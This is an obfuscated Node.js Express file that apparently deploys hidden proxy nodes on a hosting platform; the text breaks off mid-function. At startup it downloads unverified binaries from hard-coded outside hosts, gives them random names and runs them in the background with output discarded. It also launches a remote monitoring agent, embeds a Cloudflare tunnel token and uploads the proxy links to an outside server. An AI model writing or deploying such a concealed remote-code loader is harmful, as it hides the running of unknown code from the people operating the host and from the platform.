const _0x3e7365=_0x3c2c;(function(_0x25115f,_0x34fb39){const _0x480f8c={_0x4bd410:0x20d,_0x416514:0x234,_0x21f3e8:0x23b,_0x478700:0x214,_0x40dcaa:0x25c,_0x1bf10b:0x1e3,_0x624286:0x1e6,_0x401699:0x239},_0x3fc0df=_0x3c2c,_0x45b4ff=_0x25115f();while(!![]){try{const _0x5d922b=parseInt(_0x3fc0df(_0x480f8c._0x4bd410))/0x1*(parseInt(_0x3fc0df(0x204))/0x2)+parseInt(_0x3fc0df(_0x480f8c._0x416514))/0x3*(parseInt(_0x3fc0df(0x256))/0x4)+-parseInt(_0x3fc0df(_0x480f8c._0x21f3e8))/0x5*(parseInt(_0x3fc0df(0x263))/0x6)+-parseInt(_0x3fc0df(_0x480f8c._0x478700))/0x7*(-parseInt(_0x3fc0df(0x270))/0x8)+parseInt(_0x3fc0df(_0x480f8c._0x40dcaa))/0x9*(parseInt(_0x3fc0df(_0x480f8c._0x1bf10b))/0xa)+parseInt(_0x3fc0df(_0x480f8c._0x624286))/0xb+parseInt(_0x3fc0df(0x26a))/0xc*(-parseInt(_0x3fc0df(_0x480f8c._0x401699))/0xd);if(_0x5d922b===_0x34fb39)break;else _0x45b4ff['push'](_0x45b4ff['shift']());}catch(_0x2fb67d){_0x45b4ff['push'](_0x45b4ff['shift']());}}}(_0x15f4,0x5efcb));const express=require(_0x3e7365(0x22e)),app=express(),axios=require(_0x3e7365(0x24d)),os=require('os'),fs=require('fs'),path=require(_0x3e7365(0x213)),{promisify}=require(_0x3e7365(0x1f4)),exec=promisify(require(_0x3e7365(0x202))['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[_0x3e7365(0x281)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x3e7365(0x281)][_0x3e7365(0x23f)]||'',AUTO_ACCESS=process['env'][_0x3e7365(0x297)]||![],FILE_PATH=process[_0x3e7365(0x281)][_0x3e7365(0x1e1)]||'./tmp',SUB_PATH=process[_0x3e7365(0x281)]['SUB_PATH']||_0x3e7365(0x264),PORT=process[_0x3e7365(0x281)][_0x3e7365(0x227)]||process[_0x3e7365(0x281)][_0x3e7365(0x27b)]||0xbb8,UUID=process[_0x3e7365(0x281)][_0x3e7365(0x1ff)]||_0x3e7365(0x210),NEZHA_SERVER=process[_0x3e7365(0x281)][_0x3e7365(0x287)]||'',NEZHA_PORT=process['env'][_0x3e7365(0x27c)]||'',NEZHA_KEY=process[_0x3e7365(0x281)][_0x3e7365(0x294)]||'',ARGO_DOMAIN=process[_0x3e7365(0x281)]['ARGO_DOMAIN']||'railway-us-atsrsd.marshal.de5.net',ARGO_AUTH=process[_0x3e7365(0x281)][_0x3e7365(0x1f8)]||'eyJhIjoiNTNhMjVmMjE1MjBlNmRiNDUxMTlkMDk1Mjc2ZjkyYzkiLCJ0IjoiYjY0YjNhYmYtZDQ5NS00MzFjLWJkZGMtNDdkODAwMDliM2EwIiwicyI6IlptVXhZekpsTURVdFpEUXdZaTAwWWpObExXRTVOalF0WTJRNVlqZ3dZemczTTJObSJ9',ARGO_PORT=process[_0x3e7365(0x281)][_0x3e7365(0x1e7)]||0x1f41,CFIP=process[_0x3e7365(0x281)]['CFIP']||_0x3e7365(0x23a),CFPORT=process[_0x3e7365(0x281)][_0x3e7365(0x1fc)]||0x1bb,NAME=process[_0x3e7365(0x281)][_0x3e7365(0x249)]||_0x3e7365(0x289);function _0x3c2c(_0x386c2f,_0x176d11){const _0x15f4e7=_0x15f4();return _0x3c2c=function(_0x3c2c06,_0x460a37){_0x3c2c06=_0x3c2c06-0x1de;let _0x2a7353=_0x15f4e7[_0x3c2c06];return _0x2a7353;},_0x3c2c(_0x386c2f,_0x176d11);}!fs[_0x3e7365(0x222)](FILE_PATH)?(fs[_0x3e7365(0x26f)](FILE_PATH),console[_0x3e7365(0x24a)](FILE_PATH+_0x3e7365(0x1e8))):console[_0x3e7365(0x24a)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x19b591={_0x2e3b51:0x273,_0x239f5d:0x26d,_0xd3c7bf:0x233,_0x1276d2:0x231},_0x3a82cd=_0x3e7365,_0x43a104=_0x3a82cd(_0x19b591._0x2e3b51);let _0x2f7022='';for(let _0x3d7e7c=0x0;_0x3d7e7c<0x6;_0x3d7e7c++){_0x2f7022+=_0x43a104[_0x3a82cd(_0x19b591._0x239f5d)](Math[_0x3a82cd(_0x19b591._0xd3c7bf)](Math[_0x3a82cd(_0x19b591._0x1276d2)]()*_0x43a104['length']));}return _0x2f7022;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x3e7365(0x268)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x3e7365(0x268)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x3e7365(0x1ef)),listPath=path['join'](FILE_PATH,_0x3e7365(0x257)),bootLogPath=path[_0x3e7365(0x268)](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,_0x3e7365(0x236));function deleteNodes(){const _0x57be21={_0x2da1e6:0x1f5,_0x490c6e:0x253,_0x2a9e7b:0x22a},_0x4ad17d=_0x3e7365;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x5d819e;try{_0x5d819e=fs[_0x4ad17d(0x274)](subPath,_0x4ad17d(_0x57be21._0x2da1e6));}catch{return null;}const _0x1f8d6f=Buffer[_0x4ad17d(0x21d)](_0x5d819e,'base64')[_0x4ad17d(0x26c)](_0x4ad17d(0x1f5)),_0x548011=_0x1f8d6f[_0x4ad17d(0x27a)]('\x0a')[_0x4ad17d(_0x57be21._0x490c6e)](_0x269978=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4ad17d(0x259)](_0x269978));if(_0x548011['length']===0x0)return;return axios[_0x4ad17d(_0x57be21._0x2a9e7b)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x548011}),{'headers':{'Content-Type':_0x4ad17d(0x1fa)}})[_0x4ad17d(0x215)](_0x156fa0=>{return null;}),null;}catch(_0x206148){return null;}}function cleanupOldFiles(){const _0x5d3065={_0x5e3112:0x268,_0x33f1b6:0x25e},_0x183f6f=_0x3e7365;try{const _0x45043a=fs[_0x183f6f(0x1eb)](FILE_PATH);_0x45043a[_0x183f6f(0x250)](_0x2ace26=>{const _0x1f47cf=_0x183f6f,_0x326c30=path[_0x1f47cf(_0x5d3065._0x5e3112)](FILE_PATH,_0x2ace26);try{const _0x3492f3=fs[_0x1f47cf(0x1ec)](_0x326c30);_0x3492f3[_0x1f47cf(_0x5d3065._0x33f1b6)]()&&fs['unlinkSync'](_0x326c30);}catch(_0x35ff8d){}});}catch(_0x10a960){}}app[_0x3e7365(0x240)]('/',function(_0x4651a9,_0x2052fe){const _0x227836={_0x21c99a:0x247},_0x3bba18=_0x3e7365;_0x2052fe['send'](_0x3bba18(_0x227836._0x21c99a));});async function generateConfig(){const _0x33c362={_0x5208db:0x1f2,_0x5d0015:0x219,_0x4f0739:0x278,_0x245dfc:0x1fb,_0x4c5ed0:0x254,_0x305dbf:0x262,_0x4761c7:0x278,_0x23f602:0x1f0,_0x5d33c0:0x285,_0xdadbf3:0x206,_0x6d096a:0x236},_0x198f60=_0x3e7365,_0x4f4a03={'log':{'access':_0x198f60(_0x33c362._0x5208db),'error':'/dev/null','loglevel':_0x198f60(0x242)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x198f60(0x242),'fallbacks':[{'dest':0xbb9},{'path':_0x198f60(_0x33c362._0x5d0015),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x198f60(_0x33c362._0x4f0739),'dest':0xbbc}]},'streamSettings':{'network':_0x198f60(0x251)}},{'port':0xbb9,'listen':_0x198f60(_0x33c362._0x245dfc),'protocol':_0x198f60(_0x33c362._0x4c5ed0),'settings':{'clients':[{'id':UUID}],'decryption':_0x198f60(0x242)},'streamSettings':{'network':'tcp','security':_0x198f60(0x242)}},{'port':0xbba,'listen':_0x198f60(_0x33c362._0x245dfc),'protocol':_0x198f60(0x254),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x198f60(_0x33c362._0x5d0015)}},'sniffing':{'enabled':!![],'destOverride':[_0x198f60(0x262),_0x198f60(0x25f),_0x198f60(0x1f0)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x198f60(0x1fb),'protocol':_0x198f60(0x282),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x198f60(0x260)}},'sniffing':{'enabled':!![],'destOverride':[_0x198f60(_0x33c362._0x305dbf),_0x198f60(0x25f),_0x198f60(0x1f0)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x198f60(0x1fb),'protocol':_0x198f60(0x205),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x198f60(0x242),'wsSettings':{'path':_0x198f60(_0x33c362._0x4761c7)}},'sniffing':{'enabled':!![],'destOverride':[_0x198f60(_0x33c362._0x305dbf),'tls',_0x198f60(_0x33c362._0x23f602)],'metadataOnly':![]}}],'dns':{'servers':[_0x198f60(0x228)]},'outbounds':[{'protocol':'freedom','tag':_0x198f60(0x28e)},{'protocol':'blackhole','tag':_0x198f60(_0x33c362._0x5d33c0)}]};fs[_0x198f60(_0x33c362._0xdadbf3)](path[_0x198f60(0x268)](FILE_PATH,_0x198f60(_0x33c362._0x6d096a)),JSON[_0x198f60(0x20a)](_0x4f4a03,null,0x2));}function getSystemArchitecture(){const _0x3c822e={_0xd3cdb3:0x28b,_0x30caba:0x28b},_0x5c59c9=_0x3e7365,_0x242212=os[_0x5c59c9(0x28d)]();return _0x242212===_0x5c59c9(_0x3c822e._0xd3cdb3)||_0x242212===_0x5c59c9(0x230)||_0x242212===_0x5c59c9(0x21e)?_0x5c59c9(_0x3c822e._0x30caba):'amd';}function downloadFile(_0x451293,_0x8d6988,_0x3b8706){const _0x3ac189={_0x39efe7:0x1ed},_0x5d0509={_0x4c4020:0x1f3,_0xe4a06c:0x200},_0xa46c2={_0xb820bb:0x28c},_0x2ad563={_0x5a8d46:0x24a,_0x3cbf9c:0x248},_0x1ba844=_0x3e7365,_0x348e47=_0x451293;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0xd5476f=fs['createWriteStream'](_0x348e47);axios({'method':_0x1ba844(0x240),'url':_0x8d6988,'responseType':_0x1ba844(_0x3ac189._0x39efe7)})['then'](_0x3de745=>{const _0x30f87d={_0x59a76c:0x25a},_0x2f2482=_0x1ba844;_0x3de745[_0x2f2482(_0xa46c2._0xb820bb)][_0x2f2482(0x271)](_0xd5476f),_0xd5476f['on']('finish',()=>{const _0x1047ae=_0x2f2482;_0xd5476f[_0x1047ae(0x25d)](),console[_0x1047ae(_0x2ad563._0x5a8d46)](_0x1047ae(0x1f3)+path['basename'](_0x348e47)+_0x1047ae(_0x2ad563._0x3cbf9c)),_0x3b8706(null,_0x348e47);}),_0xd5476f['on']('error',_0x5bd66e=>{const _0x597987=_0x2f2482;fs[_0x597987(0x244)](_0x348e47,()=>{});const _0x5d9bb6=_0x597987(0x1f3)+path['basename'](_0x348e47)+'\x20failed:\x20'+_0x5bd66e[_0x597987(_0x30f87d._0x59a76c)];console['error'](_0x5d9bb6),_0x3b8706(_0x5d9bb6);});})[_0x1ba844(0x215)](_0x39a4f6=>{const _0x48d5c5=_0x1ba844,_0xb52a22=_0x48d5c5(_0x5d0509._0x4c4020)+path[_0x48d5c5(0x22b)](_0x348e47)+_0x48d5c5(0x23e)+_0x39a4f6[_0x48d5c5(0x25a)];console[_0x48d5c5(_0x5d0509._0xe4a06c)](_0xb52a22),_0x3b8706(_0xb52a22);});}async function downloadFilesAndRun(){const _0x257758={_0x3fe181:0x224,_0x275f7e:0x24a,_0x54221b:0x217,_0x4cce74:0x246,_0x1fa87d:0x1e2,_0xb67b65:0x280,_0x32bb14:0x1e5,_0x293fdd:0x226,_0x552cb3:0x212,_0x3804c0:0x27e,_0x59cd17:0x21f,_0x215357:0x206,_0x5487c4:0x272,_0x147bea:0x245,_0x52bf9e:0x279,_0x1091c5:0x238,_0x5ef87b:0x232,_0xed9ae0:0x1ee,_0x38afbb:0x28f,_0x577ae2:0x1e0,_0xe9fab:0x275,_0x82324:0x200,_0x47ee6c:0x220,_0x45106f:0x21b,_0x3a18fc:0x266,_0x4c7f41:0x24a},_0x4ae4a4={_0x1eaa1a:0x250},_0x1fca38=_0x3e7365,_0x23ba39=getSystemArchitecture(),_0x48b42f=getFilesForArchitecture(_0x23ba39);if(_0x48b42f[_0x1fca38(_0x257758._0x3fe181)]===0x0){console[_0x1fca38(_0x257758._0x275f7e)](_0x1fca38(_0x257758._0x54221b));return;}const _0x5db490=_0x48b42f['map'](_0x374422=>{const _0x3e9163={_0x5e60b9:0x225};return new Promise((_0x25e756,_0x42b5cd)=>{const _0x3134b7=_0x3c2c;downloadFile(_0x374422['fileName'],_0x374422[_0x3134b7(_0x3e9163._0x5e60b9)],(_0x388248,_0x2d4113)=>{_0x388248?_0x42b5cd(_0x388248):_0x25e756(_0x2d4113);});});});try{await Promise['all'](_0x5db490);}catch(_0x178b4d){console[_0x1fca38(0x200)](_0x1fca38(_0x257758._0x4cce74),_0x178b4d);return;}function _0x38ef2a(_0x3e37b2){const _0x2d7c50=_0x1fca38,_0x54c94f=0x1fd;_0x3e37b2[_0x2d7c50(_0x4ae4a4._0x1eaa1a)](_0x194a87=>{const _0x349699={_0x184940:0x293,_0x5eecf5:0x26c};fs['existsSync'](_0x194a87)&&fs['chmod'](_0x194a87,_0x54c94f,_0xba4918=>{const _0x932f18=_0x3c2c;_0xba4918?console['error']('Empowerment\x20failed\x20for\x20'+_0x194a87+':\x20'+_0xba4918):console['log'](_0x932f18(_0x349699._0x184940)+_0x194a87+':\x20'+_0x54c94f[_0x932f18(_0x349699._0x5eecf5)](0x8));});});}const _0x23751f=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x38ef2a(_0x23751f);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x419fcc=NEZHA_SERVER[_0x1fca38(0x232)](':')?NEZHA_SERVER[_0x1fca38(0x27a)](':')[_0x1fca38(0x20c)]():'',_0x192431=new Set([_0x1fca38(_0x257758._0x1fa87d),_0x1fca38(0x279),_0x1fca38(_0x257758._0xb67b65),'2087',_0x1fca38(_0x257758._0x32bb14),_0x1fca38(0x211)]),_0x29bb61=_0x192431[_0x1fca38(_0x257758._0x293fdd)](_0x419fcc)?'true':_0x1fca38(0x283),_0x34d7be='\x0aclient_secret:\x20'+NEZHA_KEY+_0x1fca38(_0x257758._0x552cb3)+NEZHA_SERVER+_0x1fca38(_0x257758._0x3804c0)+_0x29bb61+_0x1fca38(_0x257758._0x59cd17)+UUID;fs[_0x1fca38(_0x257758._0x215357)](path['join'](FILE_PATH,_0x1fca38(0x295)),_0x34d7be);const _0x31faaf=_0x1fca38(_0x257758._0x5487c4)+phpPath+_0x1fca38(_0x257758._0x147bea)+FILE_PATH+_0x1fca38(0x203);try{await exec(_0x31faaf),console[_0x1fca38(_0x257758._0x275f7e)](phpName+_0x1fca38(0x25b)),await new Promise(_0x291c8d=>setTimeout(_0x291c8d,0x3e8));}catch(_0x2548b9){console['error'](_0x1fca38(0x229)+_0x2548b9);}}else{let _0x1054ad='';const _0x48bbe6=[_0x1fca38(_0x257758._0x1fa87d),_0x1fca38(_0x257758._0x52bf9e),_0x1fca38(_0x257758._0xb67b65),_0x1fca38(_0x257758._0x1091c5),_0x1fca38(0x1e5),_0x1fca38(0x211)];_0x48bbe6[_0x1fca38(_0x257758._0x5ef87b)](NEZHA_PORT)&&(_0x1054ad=_0x1fca38(_0x257758._0xed9ae0));const _0x5e3bc4=_0x1fca38(0x272)+npmPath+_0x1fca38(_0x257758._0x38afbb)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1fca38(0x243)+NEZHA_KEY+'\x20'+_0x1054ad+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5e3bc4),console[_0x1fca38(0x24a)](npmName+_0x1fca38(0x25b)),await new Promise(_0x26ff16=>setTimeout(_0x26ff16,0x3e8));}catch(_0x5d67f1){console['error']('npm\x20running\x20error:\x20'+_0x5d67f1);}}}else console['log'](_0x1fca38(_0x257758._0x577ae2));const _0x2dd4be=_0x1fca38(0x272)+webPath+_0x1fca38(_0x257758._0xe9fab)+FILE_PATH+_0x1fca38(0x288);try{await exec(_0x2dd4be),console[_0x1fca38(0x24a)](webName+_0x1fca38(0x25b)),await new Promise(_0x5ead88=>setTimeout(_0x5ead88,0x3e8));}catch(_0x4ccd60){console[_0x1fca38(_0x257758._0x82324)]('web\x20running\x20error:\x20'+_0x4ccd60);}if(fs[_0x1fca38(0x222)](botPath)){let _0x3464a7;if(ARGO_AUTH[_0x1fca38(_0x257758._0x47ee6c)](/^[A-Z0-9a-z=]{120,250}$/))_0x3464a7='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x1fca38(_0x257758._0x47ee6c)](/TunnelSecret/)?_0x3464a7=_0x1fca38(_0x257758._0x45106f)+FILE_PATH+_0x1fca38(0x296):_0x3464a7=_0x1fca38(_0x257758._0x3a18fc)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x3464a7+_0x1fca38(0x1fe)),console[_0x1fca38(_0x257758._0x4c7f41)](botName+_0x1fca38(0x25b)),await new Promise(_0x52e2fd=>setTimeout(_0x52e2fd,0x7d0));}catch(_0x370bc1){console[_0x1fca38(_0x257758._0x82324)]('Error\x20executing\x20command:\x20'+_0x370bc1);}}await new Promise(_0x423fa9=>setTimeout(_0x423fa9,0x1388));}function getFilesForArchitecture(_0x5b4db9){const _0x4259cc={_0x1a5d09:0x1f1,_0x5d0537:0x20e,_0x210a07:0x267,_0x17015b:0x20e},_0x1e5423=_0x3e7365;let _0x49e097;_0x5b4db9===_0x1e5423(0x28b)?_0x49e097=[{'fileName':webPath,'fileUrl':_0x1e5423(_0x4259cc._0x1a5d09)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x49e097=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x1e5423(0x28a)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x42fa30=_0x5b4db9==='arm'?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x49e097[_0x1e5423(_0x4259cc._0x5d0537)]({'fileName':npmPath,'fileUrl':_0x42fa30});}else{const _0xa7ab85=_0x5b4db9==='arm'?_0x1e5423(0x1f9):_0x1e5423(_0x4259cc._0x210a07);_0x49e097[_0x1e5423(_0x4259cc._0x17015b)]({'fileName':phpPath,'fileUrl':_0xa7ab85});}}return _0x49e097;}function argoType(){const _0x265f99={_0x55bb08:0x24a,_0x305eb1:0x23c,_0x4244bc:0x232,_0x371e8d:0x206,_0x34d2bd:0x268,_0x443929:0x27a,_0x56c1c1:0x24e,_0x16a0bd:0x268,_0x46fef6:0x269},_0x11d7a0=_0x3e7365;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x11d7a0(_0x265f99._0x55bb08)](_0x11d7a0(_0x265f99._0x305eb1));return;}if(ARGO_AUTH[_0x11d7a0(_0x265f99._0x4244bc)]('TunnelSecret')){fs[_0x11d7a0(_0x265f99._0x371e8d)](path[_0x11d7a0(_0x265f99._0x34d2bd)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x4dac95=_0x11d7a0(0x1e9)+ARGO_AUTH[_0x11d7a0(_0x265f99._0x443929)]('\x22')[0xb]+_0x11d7a0(_0x265f99._0x56c1c1)+path[_0x11d7a0(_0x265f99._0x16a0bd)](FILE_PATH,'tunnel.json')+_0x11d7a0(0x1f7)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x11d7a0(_0x265f99._0x46fef6);fs[_0x11d7a0(0x206)](path['join'](FILE_PATH,'tunnel.yml'),_0x4dac95);}else console[_0x11d7a0(0x24a)](_0x11d7a0(0x241));}async function extractDomains(){const _0x212b3a={_0x4a7b8a:0x24a,_0x4d8b6e:0x274,_0x4e3f7c:0x298,_0x2dc407:0x27a,_0x3c5289:0x24a,_0x55bcad:0x22f,_0x23d7b7:0x298},_0x1bb036={_0x224273:0x28c,_0x8dfe57:0x28c,_0x1672d1:0x23d,_0x423690:0x276},_0x276e4e={_0x3a4624:0x223,_0x5a76c5:0x252,_0x4afd62:0x26d,_0x10c94e:0x1de},_0x14f63c={_0x33b77d:0x220},_0x36cc97=_0x3e7365;let _0x4435b9;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4435b9=ARGO_DOMAIN,console[_0x36cc97(_0x212b3a._0x4a7b8a)](_0x36cc97(0x201),_0x4435b9),await _0x32cfed(_0x4435b9);else try{const _0xaaaf89=fs[_0x36cc97(_0x212b3a._0x4d8b6e)](path[_0x36cc97(0x268)](FILE_PATH,_0x36cc97(_0x212b3a._0x4e3f7c)),'utf-8'),_0x5d2c34=_0xaaaf89[_0x36cc97(_0x212b3a._0x2dc407)]('\x0a'),_0x5f5d34=[];_0x5d2c34['forEach'](_0x4db76e=>{const _0x1a7da4=_0x36cc97,_0x4b4435=_0x4db76e[_0x1a7da4(_0x14f63c._0x33b77d)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4b4435){const _0x11a895=_0x4b4435[0x1];_0x5f5d34['push'](_0x11a895);}});if(_0x5f5d34['length']>0x0)_0x4435b9=_0x5f5d34[0x0],console['log']('ArgoDomain:',_0x4435b9),await _0x32cfed(_0x4435b9);else{console[_0x36cc97(_0x212b3a._0x3c5289)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x36cc97(_0x212b3a._0x55bcad)](path['join'](FILE_PATH,_0x36cc97(_0x212b3a._0x23d7b7)));async function _0x4a728e(){const _0x4f1455=_0x36cc97;try{process[_0x4f1455(0x286)]==='win32'?await exec(_0x4f1455(_0x276e4e._0x3a4624)+botName+_0x4f1455(_0x276e4e._0x5a76c5)):await exec('pkill\x20-f\x20\x22['+botName[_0x4f1455(_0x276e4e._0x4afd62)](0x0)+']'+botName[_0x4f1455(0x290)](0x1)+_0x4f1455(_0x276e4e._0x10c94e));}catch(_0x299f11){}}_0x4a728e(),await new Promise(_0x437d93=>setTimeout(_0x437d93,0xbb8));const _0x148ca0=_0x36cc97(0x266)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x148ca0+_0x36cc97(0x1fe)),console[_0x36cc97(_0x212b3a._0x4a7b8a)](botName+_0x36cc97(0x25b)),await new Promise(_0x455014=>setTimeout(_0x455014,0xbb8)),await extractDomains();}catch(_0x9a34d4){console['error']('Error\x20executing\x20command:\x20'+_0x9a34d4);}}}catch(_0x306740){console[_0x36cc97(0x200)]('Error\x20reading\x20boot.log:',_0x306740);}async function _0x39ba03(){const _0x8c6c41=_0x36cc97;try{const _0x1bf191=await axios['get']('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x1bf191[_0x8c6c41(0x28c)]&&_0x1bf191[_0x8c6c41(0x28c)][_0x8c6c41(0x1e4)]&&_0x1bf191[_0x8c6c41(_0x1bb036._0x224273)][_0x8c6c41(0x23d)])return _0x1bf191[_0x8c6c41(_0x1bb036._0x8dfe57)]['country_code']+'_'+_0x1bf191[_0x8c6c41(0x28c)][_0x8c6c41(0x23d)];}catch(_0x548fdb){try{const _0xc11396=await axios['get'](_0x8c6c41(0x207),{'timeout':0xbb8});if(_0xc11396[_0x8c6c41(_0x1bb036._0x8dfe57)]&&_0xc11396[_0x8c6c41(_0x1bb036._0x8dfe57)][_0x8c6c41(0x1f6)]===_0x8c6c41(0x216)&&_0xc11396[_0x8c6c41(0x28c)]['countryCode']&&_0xc11396[_0x8c6c41(0x28c)][_0x8c6c41(0x23d)])return _0xc11396[_0x8c6c41(0x28c)]['countryCode']+'_'+_0xc11396['data'][_0x8c6c41(_0x1bb036._0x1672d1)];}catch(_0x243970){}}return _0x8c6c41(_0x1bb036._0x423690);}async function _0x32cfed(_0x252bf6){const _0x560294=await _0x39ba03(),_0x1c4573=NAME?NAME+'-'+_0x560294:_0x560294;return new Promise(_0x401baf=>{const _0x22e4a7={_0x5672b8:0x242,_0x14dd28:0x242,_0x2472c8:0x24b,_0x4cdfaa:0x25f,_0x8117c7:0x22d,_0x4047d6:0x21d,_0x44dc2e:0x20a,_0x103ae6:0x26c,_0x5d856a:0x22c,_0x407e03:0x235,_0x52d01f:0x277,_0x3df3c1:0x218,_0x5d3cb8:0x24a,_0x4cc694:0x21d,_0xff5d77:0x21c,_0x1e72b2:0x24c},_0x45aebc={_0x1955b3:0x221,_0x404962:0x1ea,_0x50f601:0x237};setTimeout(()=>{const _0x5214d5=_0x3c2c,_0x47c489={'v':'2','ps':''+_0x1c4573,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5214d5(_0x22e4a7._0x5672b8),'net':'ws','type':_0x5214d5(_0x22e4a7._0x14dd28),'host':_0x252bf6,'path':_0x5214d5(_0x22e4a7._0x2472c8),'tls':_0x5214d5(_0x22e4a7._0x4cdfaa),'sni':_0x252bf6,'alpn':'','fp':_0x5214d5(0x1df)},_0x44ba4b='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x5214d5(0x284)+_0x252bf6+_0x5214d5(0x235)+_0x252bf6+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x1c4573+_0x5214d5(_0x22e4a7._0x8117c7)+Buffer[_0x5214d5(_0x22e4a7._0x4047d6)](JSON[_0x5214d5(_0x22e4a7._0x44dc2e)](_0x47c489))[_0x5214d5(_0x22e4a7._0x103ae6)](_0x5214d5(0x21c))+_0x5214d5(_0x22e4a7._0x5d856a)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x252bf6+_0x5214d5(_0x22e4a7._0x407e03)+_0x252bf6+_0x5214d5(_0x22e4a7._0x52d01f)+_0x1c4573+_0x5214d5(_0x22e4a7._0x3df3c1);console[_0x5214d5(_0x22e4a7._0x5d3cb8)](Buffer[_0x5214d5(0x21d)](_0x44ba4b)['toString']('base64')),fs[_0x5214d5(0x206)](subPath,Buffer[_0x5214d5(_0x22e4a7._0x4cc694)](_0x44ba4b)[_0x5214d5(0x26c)](_0x5214d5(_0x22e4a7._0xff5d77))),console[_0x5214d5(0x24a)](FILE_PATH+_0x5214d5(_0x22e4a7._0x1e72b2)),uploadNodes(),app[_0x5214d5(0x240)]('/'+SUB_PATH,(_0x1ac5dc,_0x19e186)=>{const _0x58d5c6=_0x5214d5,_0x537230=Buffer[_0x58d5c6(0x21d)](_0x44ba4b)[_0x58d5c6(0x26c)](_0x58d5c6(0x21c));_0x19e186[_0x58d5c6(_0x45aebc._0x1955b3)](_0x58d5c6(0x208),_0x58d5c6(_0x45aebc._0x404962)),_0x19e186[_0x58d5c6(_0x45aebc._0x50f601)](_0x537230);}),_0x401baf(_0x44ba4b);},0x7d0);});}}async function uploadNodes(){const _0x4d1ad4={_0x3be9d0:0x255,_0x35a66e:0x258,_0x5412d6:0x258,_0xc7f0da:0x1f6,_0x157554:0x222,_0x3be902:0x1f5,_0x3098b6:0x22a,_0x1eb86b:0x1f6,_0x355aa8:0x24a,_0x4d8f52:0x291},_0x262e57=_0x3e7365;if(UPLOAD_URL&&PROJECT_URL){const _0x2bc2d4=PROJECT_URL+'/'+SUB_PATH,_0x2d5f6c={'subscription':[_0x2bc2d4]};try{const _0x27945b=await axios[_0x262e57(0x22a)](UPLOAD_URL+_0x262e57(_0x4d1ad4._0x3be9d0),_0x2d5f6c,{'headers':{'Content-Type':'application/json'}});return _0x27945b&&_0x27945b[_0x262e57(0x1f6)]===0xc8?(console['log'](_0x262e57(0x209)),_0x27945b):null;}catch(_0x1506a7){if(_0x1506a7[_0x262e57(_0x4d1ad4._0x35a66e)]){if(_0x1506a7[_0x262e57(_0x4d1ad4._0x5412d6)][_0x262e57(_0x4d1ad4._0xc7f0da)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x262e57(_0x4d1ad4._0x157554)](listPath))return;const _0x2099a3=fs['readFileSync'](listPath,_0x262e57(_0x4d1ad4._0x3be902)),_0x3eb6e2=_0x2099a3['split']('\x0a')['filter'](_0x4a6430=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x262e57(0x259)](_0x4a6430));if(_0x3eb6e2[_0x262e57(0x224)]===0x0)return;const _0x56acf8=JSON['stringify']({'nodes':_0x3eb6e2});try{const _0x5e628=await axios[_0x262e57(_0x4d1ad4._0x3098b6)](UPLOAD_URL+_0x262e57(0x20b),_0x56acf8,{'headers':{'Content-Type':_0x262e57(0x1fa)}});return 